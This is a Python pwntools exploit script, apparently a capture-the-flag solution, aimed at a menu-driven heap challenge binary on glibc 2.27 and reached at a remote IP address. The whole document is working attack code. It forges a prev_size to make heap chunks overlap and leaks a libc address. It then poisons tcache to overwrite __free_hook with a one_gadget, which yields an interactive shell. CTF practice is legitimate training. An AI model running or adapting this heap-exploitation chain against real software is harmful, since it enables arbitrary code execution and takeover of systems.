from pwn import *

context(arch='amd64', os='linux')

file_name = './z1r0'

debug = 1
if debug:
    r = remote('123.60.63.39', 49155)
else:
    r = process(file_name)

elf = ELF(file_name)

libc = ELF('libc-2.27.so')

menu = 'Your choice: '

def dbg():
    gdb.attach(r)

def add(index, size):
    r.sendlineafter(menu, '1')
    r.sendlineafter('Index: ', str(index))
    r.sendlineafter('Size: ', str(size))

def edit(index, content):
    r.sendlineafter(menu, '2')
    r.sendlineafter('Index: ', str(index))
    r.sendlineafter('Content: ', content)

def show(index):
    r.sendlineafter(menu, '3')
    r.sendlineafter('Index: ', str(index))

def free(index):
    r.sendlineafter(menu, '4')
    r.sendlineafter('Index: ', str(index))


for i in range(7):
    add(i, 0xf8)


add(7, 0xf8)
add(8, 0x88)#8
add(9, 0xf8)#9
add(10, 0x88)#10
for i in range(7):
    free(i)
free(8)
free(7)

add(8, 0x88)
p1 = b"a"*0x80+p64(0x90+0x100)
edit(8, p1)

free(9)

for i in range(7):
    add(i, 0xf8)

add(7, 0xf8)
show(7)

libc_base = u64(r.recvuntil("\x7f")[-6:].ljust(8,b"\x00")) - 736 - 0x10 - libc.sym['__malloc_hook']
success('libc_base = ' + hex(libc_base))
free_hook = libc_base + libc.sym['__free_hook']
success('free_hook = ' + hex(free_hook))
one = [0x4f3d5, 0x4f432, 0x10a41c]
one_gadget = one[1] + libc_base

add(9, 0xf8)

free(9)

p2 = p64(free_hook)
edit(8, p2)

add(11, 0xf8)
add(12, 0xf8)
edit(12, p64(one_gadget))

free(11)




r.interactive()
